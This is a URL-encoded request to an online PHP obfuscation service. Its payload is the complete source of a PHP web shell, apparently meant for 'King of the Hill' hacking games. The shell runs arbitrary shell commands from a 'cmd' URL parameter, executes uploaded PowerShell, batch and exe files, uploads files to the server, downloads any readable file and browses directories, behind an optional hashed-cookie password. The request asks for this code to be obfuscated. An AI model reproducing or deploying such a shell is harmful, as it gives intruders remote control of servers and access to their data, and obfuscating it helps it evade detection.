p_source=%3c%3fphp%0d%0a++++%2f%2f+Password+protection%2c+useful+for+King+of+The+Hill+games%0d%0a++++%24pass%3d%27%27%3b+%2f%2f+Set+to+null+to+disable%3b+Set+to+string+to+enable%2c+must+be+the+sha512+hash+of+the+password.%0d%0a%0d%0a++++++++global+%24cmdresults%3b%0d%0a++++++++global+%24retval%3b%0d%0a++++if(%24pass+!%3d+null)+%7b%0d%0a++++++++if+(isset(%24_COOKIE%5b%27pass%27%5d))+%7b+%2f%2f+We+use+cookies+and+not+url+parameter+for+security+reasons%0d%0a++++++++++++%2f%2f+As+it+is+likely+that+URL+parameters+are+logged+by+the+webserver%2c+thus+revealing+the+password%0d%0a++++++++++++if+(hash(%27sha512%27%2c+%24_COOKIE%5b%27pass%27%5d)+!%3d%3d+%24pass)+%7b%0d%0a++++++++++++++++echo+%22Wrong+password+!%22%3b%0d%0a++++++++++++++++exit%3b%0d%0a++++++++++++%7d%0d%0a++++++++%7d+else+%7b%0d%0a++++++++++++echo+%22Wrong+password+!%22%3b%0d%0a++++++++++++exit%3b%0d%0a++++++++%7d%0d%0a++++%7d%0d%0a%0d%0a++++function+getAbsolute(string+%24path)%3a+string%0d%0a++++%7b%0d%0a++++++++%2f%2f+Cleaning+path+regarding+OS%0d%0a++++++++%24path+%3d+mb_ereg_replace(%27%5c%5c%5c%5c%7c%2f%27%2c+%27%2f%27%2c+%24path%2c+%27msr%27)%3b%0d%0a++++++++%2f%2f+Check+if+path+start+with+a+separator+(UNIX)%0d%0a++++++++%24startWithSeparator+%3d+%24path%5b0%5d+%3d%3d%3d+%27%2f%27%3b%0d%0a++++++++%2f%2f+Check+if+start+with+drive+letter%0d%0a++++++++preg_match(%27%2f%5e%5ba-z%5d%3a%2f%27%2c+%24path%2c+%24matches)%3b%0d%0a++++++++%24startWithLetterDir+%3d+isset(%24matches%5b0%5d)+%3f+%24matches%5b0%5d+%3a+false%3b%0d%0a++++++++%2f%2f+Get+and+filter+empty+sub+paths%0d%0a++++++++%24subPaths+%3d+array_filter(explode(%27%2f%27%2c+%24path)%2c+%27mb_strlen%27)%3b%0d%0a%0d%0a++++++++%24absolutes+%3d+%5b%5d%3b%0d%0a++++++++foreach+(%24subPaths+as+%24subPath)+%7b%0d%0a++++++++++++if+(%27.%27+%3d%3d%3d+%24subPath)+%7b%0d%0a++++++++++++++++continue%3b%0d%0a++++++++++++%7d%0d%0a++++++++++++%2f%2f+if+%24startWithSeparator+is+false%0d%0a++++++++++++%2f%2f+and+%24startWithLetterDir%0d%0a++++++++++++%2f%2f+and+(absolutes+is+empty+or+all+previous+values+are+..)%0d%0a++++++++++++%2f%2f+save+absolute+cause+that%27s+a+relative+and+we+can%27t+deal+with+that+and+just+forget+that+we+want+go+up%0d%0a++++++++++++if+(%27..%27+%3d%3d%3d+%24subPath%0d%0a++++++++++++++++%26%26+!%24startWithSeparator%0d%0a++++++++++++++++%26%26+!%24startWithLetterDir%0d%0a++++++++++++++++%26%26+empty(array_filter(%24absolutes%2c+function+(%24value)+%7b+return+!(%27..%27+%3d%3d%3d+%24value)%3b+%7d))%0d%0a++++++++++++)+%7b%0d%0a++++++++++++++++%24absolutes%5b%5d+%3d+%24subPath%3b%0d%0a++++++++++++++++continue%3b%0d%0a++++++++++++%7d%0d%0a++++++++++++if+(%27..%27+%3d%3d%3d+%24subPath)+%7b%0d%0a++++++++++++++++array_pop(%24absolutes)%3b%0d%0a++++++++++++++++continue%3b%0d%0a++++++++++++%7d%0d%0a++++++++++++%24absolutes%5b%5d+%3d+%24subPath%3b%0d%0a++++++++%7d%0d%0a%0d%0a++++++++return%0d%0a++++++++++++((%24startWithSeparator+%3f+%27%2f%27+%3a+%24startWithLetterDir)+%3f%0d%0a++++++++++++++++%24startWithLetterDir.%27%2f%27+%3a+%27%27%0d%0a++++++++++++).implode(%27%2f%27%2c+%24absolutes)%3b%0d%0a++++%7d%0d%0a%0d%0a++++%2f%2f+Upload+file+to+the+server%0d%0a++++if+(isset(%24_POST%5b%27upload%27%5d))+%7b%0d%0a++++++++%24desinationDir+%3d+getDir()%3b%0d%0a++++++++%24destinationFile+%3d+%24desinationDir.%27%2f%27.basename(%24_FILES%5b%27file%27%5d%5b%27name%27%5d)%3b%0d%0a%0d%0a++++++++if+(file_exists(%24destinationFile))+%7b%0d%0a++++++++++++echo+%22%3cscript%3ealert(%27Error%3a+File+already+exists+!%27)%3c%2fscript%3e%22%3b%0d%0a++++++++%7d%0d%0a++++++++else+if+(move_uploaded_file(%24_FILES%5b%27file%27%5d%5b%27tmp_name%27%5d%2c+%24destinationFile))+%7b%0d%0a++++++++++++echo+%22%3cscript%3ealert(%27File+uploaded+successfuly+!%27)%3c%2fscript%3e%22%3b%0d%0a++++++++%7d+else+%7b%0d%0a++++++++++++echo+%22%3cscript%3ealert(%27Error%3a+Could+not+upload+file+!%27)%3c%2fscript%3e%22%3b%0d%0a++++++++%7d%0d%0a++++%0d%0a++++%7d%0d%0a++++else+if+(isset(%24_GET%5b%27runscript%27%5d))+%7b%0d%0a++++++++%24script+%3d+%24_GET%5b%27runscript%27%5d%3b%0d%0a++++++++%24scriptPath+%3d+getAbsolute(%24script)%3b%0d%0a++++++++%24command+%3d+%27pwsh+-Noni+-Nop+-File+%22%27+.+%24scriptPath+.+%27%22%27%3b%0d%0a++++++++global+%24cmdresults%3b%0d%0a++++++++global+%24retval%3b%0d%0a++++++++%24cmdresults+%3d+shell_exec(%24command)%3b%0d%0a++++%7d%0d%0a++++else+if+(isset(%24_GET%5b%27runexe%27%5d))+%7b%0d%0a++++++++%24script+%3d+%24_GET%5b%27runexe%27%5d%3b%0d%0a++++++++%24scriptPath+%3d+getAbsolute(%24script)%3b%0d%0a++++++++%24command+%3d+%24scriptPath%3b%0d%0a++++++++exec(%27cd+%27.realpath(getDir()).%27+%26%26+%27.%24scriptPath%2c+%24cmdresults%2c+%24retval)%3b%0d%0a++++%7d%0d%0a++++else+if+(isset(%24_GET%5b%27runbat%27%5d))+%7b%0d%0a++++++++%24script+%3d+%24_GET%5b%27runbat%27%5d%3b%0d%0a++++++++%24scriptPath+%3d+getAbsolute(%24script)%3b%0d%0a++++++++%24command+%3d+%27pwsh+-Noni+-Nop+-Command+%7b+Start-Process+%22cmd.exe%22+-ArgumentList+%40(%22%2fk%22%2c%22%27+.+%24scriptPath+.+%27)+%7d%27%3b%0d%0a++++++++exec(%27cd+%27.realpath(getDir()).%27+%26%26+%27.%24scriptPath%2c+%24cmdresults%2c+%24retval)%3b%0d%0a++++%7d%0d%0a++++%0d%0a++++%2f%2f+Download+a+file+from+the+server%0d%0a++++if+(isset(%24_GET%5b%27download%27%5d))+%7b%0d%0a++++++++%24file+%3d+%24_GET%5b%27download%27%5d%3b%0d%0a++++++++if+(file_exists(%24file))+%7b%0d%0a++++++++++++if+(is_readable(%24file))+%7b%0d%0a++++++++++++++++header(%27Content-Description%3a+File+Transfer%27)%3b%0d%0a++++++++++++++++header(%27Content-Type%3a+application%2foctet-stream%27)%3b%0d%0a++++++++++++++++header(%27Content-Disposition%3a+attachment%3b+filename%3d%22%27.basename(%24file).%27%22%27)%3b%0d%0a++++++++++++++++header(%27Expires%3a+0%27)%3b%0d%0a++++++++++++++++header(%27Cache-Control%3a+must-revalidate%27)%3b%0d%0a++++++++++++++++header(%27Pragma%3a+public%27)%3b%0d%0a++++++++++++++++header(%27Content-Length%3a+%27.filesize(%24file))%3b%0d%0a++++++++++++++++readfile(%24file)%3b%0d%0a++++++++++++++++exit%3b%0d%0a++++++++++++%7d+else+%7b%0d%0a++++++++++++++++echo+%22%3cscript%3ealert(%27Error%3a+Could+not+read+the+file+!%27)%3c%2fscript%3e%22%3b%0d%0a++++++++++++++++exit%3b%0d%0a++++++++++++%7d%0d%0a++++++++%7d%0d%0a++++%7d%0d%0a%0d%0a++++function+getHeaderColor()%7b%0d%0a++++++++return+%27rgb(32%2c+0%2c+128)%27%3b%0d%0a++++%7d%0d%0a++++function+getPrimaryColor()%7b%0d%0a++++++++return+%27%2300ff00%27%3b%0d%0a++++%7d%0d%0a++++function+getSecondaryColor()%7b%0d%0a++++++++return+%27%23d92626%27%3b%0d%0a++++%7d%0d%0a++++function+getCommandColor()%7b%0d%0a++++++++return+%27%23ff0066%27%3b%0d%0a++++%7d%0d%0a++++function+getCommandOutputColor()%7b%0d%0a++++++++return+%27%233ADF00%27%3b%0d%0a++++%7d%0d%0a++++function+getExplorerColor()%7b%0d%0a++++++++return+%27%233ADF00%27%3b%0d%0a++++%7d%0d%0a++++function+getDirectoryColor()%7b%0d%0a++++++++return+%27%233ADF00%27%3b%0d%0a++++%7d%0d%0a++++function+getNavTextColor()%7b%0d%0a++++++++return+%27%23ff5500%27%3b%0d%0a++++%7d%0d%0a++++function+getHeaderTextColor()%7b%0d%0a++++++++return+%27%23C0C0C0%27%3b%0d%0a++++%7d%0d%0a++++function+getNavTextHoverColor()%7b%0d%0a++++++++return+%27%23C0C0C0%27%3b%0d%0a++++%7d%0d%0a++++function+getButtonsColor()%7b%0d%0a++++++++return+%27%233ADF00%27%3b%0d%0a++++%7d%0d%0a++++function+getBgColor(%24level)%7b%0d%0a++++++++switch+(%24level)+%7b%0d%0a++++++++++case+1%3a%0d%0a++++++++++++return+%27%23101010%27%3b%0d%0a++++++++++++break%3b%0d%0a++++++++++case+2%3a%0d%0a++++++++++++return+%27%23202020%27%3b%0d%0a++++++++++++break%3b%0d%0a++++++++++case+3%3a%0d%0a++++++++++++return+%27%23303030%27%3b%0d%0a++++++++++++break%3b%0d%0a++++++++++case+4%3a%0d%0a++++++++++++return+%27%23404040%27%3b%0d%0a++++++++++++break%3b%0d%0a++++++++++default%3a%0d%0a++++++++++++return+%27%23404040%27%3b%0d%0a++++++++%7d%0d%0a++++++++return+%27%23404040%27%3b%0d%0a++++%7d%0d%0a++++function+fileExtension(%24name)+%7b%0d%0a++++++++%24n+%3d+strrpos(%24name%2c+%27.%27)%3b%0d%0a++++++++return+(%24n+%3d%3d%3d+false)+%3f+%27%27+%3a+substr(%24name%2c+%24n%2b1)%3b%0d%0a++++%7d%0d%0a++++function+getItemSize(%24filename)+%7b%0d%0a++++++++%24retval+%3d++%27%27%3b%0d%0a++++++++%24fname+%3d+getDir().%27%2f%27.%24filename%3b%0d%0a++++++++if+(is_dir(%24fname))%7b++%0d%0a++++++++++++%24retval+.%3d++%27%3ctd+style%3d%22color%3a+%22%27+.++getDirectoryColor()+.+%27%22%3e%27%3b%0d%0a++++++++++++%24retval+.%3d+htmlspecialchars(%27%3cdir%3e%27)%3b%0d%0a++++++++%7d%0d%0a++++++++else%7b%0d%0a++++++++++++%24retval+.%3d++%27%3ctd+style%3d%22color%3a+%22%27+.++getSecondaryColor()+.+%27%22%3e%27%3b%0d%0a++++++++++++%24retsize+%3d+formatSizeUnits(filesize(%24fname))%3b%0d%0a++++++++++++%24retval+.%3d+%24retsize%3b%0d%0a++++++++%7d%0d%0a++++++++%24retval+.%3d+%27%3c%2ftd%3e%27%3b%0d%0a++++++++return+%24retval%3b%0d%0a++++%7d%0d%0a++++function+getItemActions(%24filename)+%7b%0d%0a++++++++%24retval+%3d++%27%27%3b%0d%0a++++++++%24ext+%3d+pathinfo(%24filename%2c+PATHINFO_EXTENSION)%3b%0d%0a++++++++switch+(%24ext)+%7b%0d%0a++++++++++case+%22ps1%22%3a%0d%0a++++++++++++%24retval+.%3d++%27%3ctd+style%3d%22color%3a+%22%27+.++getSecondaryColor()+.+%27%22%3e%27%3b%0d%0a++++++++++++%24retval+.%3d+makeRunScriptFile(%24filename)%3b%0d%0a++++++++++++break%3b%0d%0a++++++++++case+%22bat%22%3a%0d%0a++++++++++++%24retval+.%3d++%27%3ctd+style%3d%22color%3a+%22%27+.++getSecondaryColor()+.+%27%22%3e%27%3b%0d%0a++++++++++++%24retval+.%3d+makeRunBatFile(%24filename)%3b%0d%0a++++++++++++break%3b%0d%0a++++++++++case+%22exe%22%3a%0d%0a++++++++++++%24retval+.%3d++%27%3ctd+style%3d%22color%3a+%22%27+.++getSecondaryColor()+.+%27%22%3e%27%3b%0d%0a++++++++++++%24retval+.%3d+makeRunExeFile(%24filename)%3b%0d%0a++++++++++++break%3b%0d%0a++++++++++default%3a%0d%0a++++++++++++%24retval+.%3d++%27%3ctd+style%3d%22color%3a+%22%27+.++getSecondaryColor()+.+%27%22%3e%27%3b%0d%0a++++++++++++%24retval+.%3d+htmlspecialchars(%27noop%27)%3b%0d%0a++++++++%7d%0d%0a++++++++%24retval+.%3d+%27%3c%2ftd%3e%27%3b%0d%0a++++++++return+%24retval%3b%0d%0a++++%7d%0d%0a++++function+printPerms(%24file)+%7b%0d%0a++++++++%24mode+%3d+fileperms(%24file)%3b%0d%0a++++++++if(+%24mode+%26+0x1000+)+%7b+%24type%3d%27p%27%3b+%7d%0d%0a++++++++else+if(+%24mode+%26+0x2000+)+%7b+%24type%3d%27c%27%3b+%7d%0d%0a++++++++else+if(+%24mode+%26+0x4000+)+%7b+%24type%3d%27d%27%3b+%7d%0d%0a++++++++else+if(+%24mode+%26+0x6000+)+%7b+%24type%3d%27b%27%3b+%7d%0d%0a++++++++else+if(+%24mode+%26+0x8000+)+%7b+%24type%3d%27-%27%3b+%7d%0d%0a++++++++else+if(+%24mode+%26+0xA000+)+%7b+%24type%3d%27l%27%3b+%7d%0d%0a++++++++else+if(+%24mode+%26+0xC000+)+%7b+%24type%3d%27s%27%3b+%7d%0d%0a++++++++else+%24type%3d%27u%27%3b%0d%0a++++++++%24owner%5b%22read%22%5d+%3d+(%24mode+%26+00400)+%3f+%27r%27+%3a+%27-%27%3b%0d%0a++++++++%24owner%5b%22write%22%5d+%3d+(%24mode+%26+00200)+%3f+%27w%27+%3a+%27-%27%3b%0d%0a++++++++%24owner%5b%22execute%22%5d+%3d+(%24mode+%26+00100)+%3f+%27x%27+%3a+%27-%27%3b%0d%0a++++++++%24group%5b%22read%22%5d+%3d+(%24mode+%26+00040)+%3f+%27r%27+%3a+%27-%27%3b%0d%0a++++++++%24group%5b%22write%22%5d+%3d+(%24mode+%26+00020)+%3f+%27w%27+%3a+%27-%27%3b%0d%0a++++++++%24group%5b%22execute%22%5d+%3d+(%24mode+%26+00010)+%3f+%27x%27+%3a+%27-%27%3b%0d%0a++++++++%24world%5b%22read%22%5d+%3d+(%24mode+%26+00004)+%3f+%27r%27+%3a+%27-%27%3b%0d%0a++++++++%24world%5b%22write%22%5d+%3d+(%24mode+%26+00002)+%3f+%27w%27+%3a+%27-%27%3b%0d%0a++++++++%24world%5b%22execute%22%5d+%3d+(%24mode+%26+00001)+%3f+%27x%27+%3a+%27-%27%3b%0d%0a++++++++if(+%24mode+%26+0x800+)+%24owner%5b%22execute%22%5d+%3d+(%24owner%5b%27execute%27%5d%3d%3d%27x%27)+%3f+%27s%27+%3a+%27S%27%3b%0d%0a++++++++if(+%24mode+%26+0x400+)+%24group%5b%22execute%22%5d+%3d+(%24group%5b%27execute%27%5d%3d%3d%27x%27)+%3f+%27s%27+%3a+%27S%27%3b%0d%0a++++++++if(+%24mode+%26+0x200+)+%24world%5b%22execute%22%5d+%3d+(%24world%5b%27execute%27%5d%3d%3d%27x%27)+%3f+%27t%27+%3a+%27T%27%3b%0d%0a++++++++%24s%3dsprintf(%22%251s%22%2c+%24type)%3b%0d%0a++++++++%24s.%3dsprintf(%22%251s%251s%251s%22%2c+%24owner%5b%27read%27%5d%2c+%24owner%5b%27write%27%5d%2c+%24owner%5b%27execute%27%5d)%3b%0d%0a++++++++%24s.%3dsprintf(%22%251s%251s%251s%22%2c+%24group%5b%27read%27%5d%2c+%24group%5b%27write%27%5d%2c+%24group%5b%27execute%27%5d)%3b%0d%0a++++++++%24s.%3dsprintf(%22%251s%251s%251s%22%2c+%24world%5b%27read%27%5d%2c+%24world%5b%27write%27%5d%2c+%24world%5b%27execute%27%5d)%3b%0d%0a++++++++return+%24s%3b%0d%0a++++%7d%0d%0a%0d%0a++++function+formatSizeUnits(%24bytes)+%7b%0d%0a++++++++if+(%24bytes+%3e%3d+1073741824)%0d%0a++++++++%7b%0d%0a++++++++++++%24bytes+%3d+number_format(%24bytes+%2f+1073741824%2c+2)+.+%27+GB%27%3b%0d%0a++++++++%7d%0d%0a++++++++elseif+(%24bytes+%3e%3d+1048576)%0d%0a++++++++%7b%0d%0a++++++++++++%24bytes+%3d+number_format(%24bytes+%2f+1048576%2c+2)+.+%27+MB%27%3b%0d%0a++++++++%7d%0d%0a++++++++elseif+(%24bytes+%3e%3d+1024)%0d%0a++++++++%7b%0d%0a++++++++++++%24bytes+%3d+number_format(%24bytes+%2f+1024%2c+2)+.+%27+KB%27%3b%0d%0a++++++++%7d%0d%0a++++++++elseif+(%24bytes+%3e+1)%0d%0a++++++++%7b%0d%0a++++++++++++%24bytes+%3d+%24bytes+.+%27+bytes%27%3b%0d%0a++++++++%7d%0d%0a++++++++elseif+(%24bytes+%3d%3d+1)%0d%0a++++++++%7b%0d%0a++++++++++++%24bytes+%3d+%24bytes+.+%27+byte%27%3b%0d%0a++++++++%7d%0d%0a++++++++else%0d%0a++++++++%7b%0d%0a++++++++++++%24bytes+%3d+%270+bytes%27%3b%0d%0a++++++++%7d%0d%0a%0d%0a++++++++return+%24bytes%3b%0d%0a++++%7d%0d%0a%0d%0a%0d%0a++++function+getDir()+%7b%0d%0a++++++++return+isset(%24_GET%5b%27dir%27%5d)+%3f+realpath(%24_GET%5b%27dir%27%5d)+%3a+getcwd()%3b%0d%0a++++%7d%0d%0a%0d%0a%0d%0a++++function+makeFileName(%24file)+%7b%0d%0a++++++++if+(is_dir(getDir().%27%2f%27.%24file))+%7b%0d%0a++++++++++++return+%27%3ca+href%3d%22%27.%24_SERVER%5b%27PHP_SELF%27%5d.%27%3fdir%3d%27.realpath(getDir().%27%2f%27.%24file).%27%22%3e%27.%24file.%27%3c%2fa%3e%27%3b%0d%0a++++++++%7d+else+%7b%0d%0a++++++++++++return+%27%3ca+href%3d%22%27.%24_SERVER%5b%27PHP_SELF%27%5d.%27%3fdownload%3d%27.realpath(getDir().%27%2f%27.%24file).%27%22%3e%27.%24file.%27%3c%2fa%3e%27%3b%0d%0a++++++++%7d%0d%0a++++%7d%0d%0a++++function+makeRunScriptFile(%24file)+%7b%0d%0a++++++++return+%27%3ca+href%3d%22%27.%24_SERVER%5b%27PHP_SELF%27%5d.%27%3frunscript%3d%27.getAbsolute(getDir().%27%2f%27.%24file).%27%26dir%3d%27.realpath(getDir())+.+%27%22%3e%27.%27run%3c%2fa%3e%27%3b%0d%0a++++%7d%0d%0a++++function+makeRunExeFile(%24file)+%7b%0d%0a++++++++return+%27%3ca+href%3d%22%27.%24_SERVER%5b%27PHP_SELF%27%5d.%27%3frunexe%3d%27.getAbsolute(getDir().%27%2f%27.%24file).%27%26dir%3d%27.realpath(getDir())+.+%27%22%3e%27.%27run%3c%2fa%3e%27%3b%0d%0a++++%7d%0d%0a++++function+makeRunBatFile(%24file)+%7b%0d%0a++++++++return+%27%3ca+href%3d%22%27.%24_SERVER%5b%27PHP_SELF%27%5d.%27%3frunbat%3d%27.getAbsolute(getDir().%27%2f%27.%24file).%27%26dir%3d%27.realpath(getDir())+.+%27%22%3e%27.%27run%3c%2fa%3e%27%3b%0d%0a++++%7d%0d%0a++++function+getFiles()+%7b%0d%0a++++++++%24files+%3d+scandir(getDir())%3b%0d%0a%0d%0a++++++++%24even+%3d+true%3b%0d%0a++++++++if+(%24files+!%3d+null)+%7b%0d%0a++++++++++++foreach(%24files+as+%24filename)%7b%0d%0a++++++++++++++++%2f%2fSimply+print+them+out+onto+the+screen.%0d%0a++++++++++++++++echo+%27%3ctr+style%3d%22background-color%3a%27.(%24even++%3f+%27%23515151%27+%3a+%27%23212121%27).%27%3b%22%3e%27%3b%0d%0a++++++++++++++++echo+%27%3ctd+style%3d%22font-weight%3athin%3b%22%3e%27.makeFileName(%24filename).%27%3c%2ftd%3e%27%3b+%0d%0a++++++++++++++++%2f%2fecho+%27%3ctd%3eowner%3c%2ftd%3e%27%3b%0d%0a++++++++++++++++%2f%2fecho+%27%3ctd%3e%27.printPerms(getDir().%27%2f%27.%24filename).%27%3c%2ftd%3e%27%3b%0d%0a++++++++++++++++echo+%27%27.getItemSize(%24filename).%27%27%3b%0d%0a++++++++++++++++echo+%27%27.getItemActions(%24filename).%27%27%3b%0d%0a++++++++++++++++echo+%27%3c%2ftr%3e%27%3b%0d%0a++++++++++++++++%24even+%3d+!%24even%3b%0d%0a++++++++++++%7d%0d%0a++++++++%7d+else+%7b%0d%0a++++++++++++echo+%22%3cp%3eCouldn%27t+open+that+directory+!%22%3b%0d%0a++++++++%7d%0d%0a++++%7d%0d%0a%0d%0a++++function+getCmdResults()+%7b%0d%0a++++++++global+%24cmdresults%3b%0d%0a++++++++global+%24retval%3b%0d%0a++++++++%0d%0a++++++++if+(%24retval+%3d%3d+0+)+%7b%0d%0a++++++++++++if(%24cmdresults+!%3d+null)%7b%0d%0a++++++++++++++++foreach+(%24cmdresults+as+%24line)+%7b%0d%0a%0d%0a++++++++++++++++++++if(%24line+!%3d+null)%7b%0d%0a++++++++++++++++++++++++echo+%22%3cbr%3e%22%3b%0d%0a++++++++++++++++++++++++echo+htmlspecialchars(%24line)%3b%0d%0a++++++++++++++++++++++++echo+%22%5cn%22%3b%0d%0a++++++++++++++++++++++++%0d%0a++++++++++++++++++++%7d%0d%0a++++++++++++++++%7d%0d%0a++++++++++++%7d%0d%0a++++++++%7d+else+%7b%0d%0a++++++++++++echo+%22Execution+failed+with+error+code%3a+%22.%24retval%3b%0d%0a++++++++%7d++++%0d%0a++++%7d%0d%0a%0d%0a++++function+getCommandLine()+%7b%0d%0a++++++++%24hostname+%3d+gethostname()+%3f%3f+%27none%27%3b%0d%0a++++++++%24username+%3d+get_current_user()%3b%0d%0a++++++++%24dir+%3d+getDir()%3b%0d%0a++++++++%24cmd+%3d+isset(%24_GET%5b%27cmd%27%5d)+%3f+%24_GET%5b%27cmd%27%5d+%3a+%27%27%3b%0d%0a%0d%0a++++++++return+%27%3cspan+style%3d%22color%3a+%23ff6347%22%3e%27.%24username.%27%40%27.%24hostname.%27%3c%2fspan%3e%3a+%3cspan+style%3d%22color%3a+%23B40404%22%3e%27.%24dir.%27%3c%2fspan%3e%24+%27.%24cmd%3b%0d%0a++++%7d%0d%0a%0d%0a++++if+(isset(%24_GET%5b%27cmd%27%5d))+%7b%0d%0a++++++++exec(%27cd+%27.realpath(getDir()).%27+%26%26+%27.%24_GET%5b%27cmd%27%5d%2c+%24cmdresults%2c+%24retval)%3b%0d%0a++++%7d%0d%0a%3f%3e&p_obcom=1&p_obvar=1p_obstr=1p_obashex=1&p_obpredelim=&p_obmethod=CRC32&p_obprelen=2&p_obmd5len=8&submit=Obfuscate+Source+Code&p_send=1
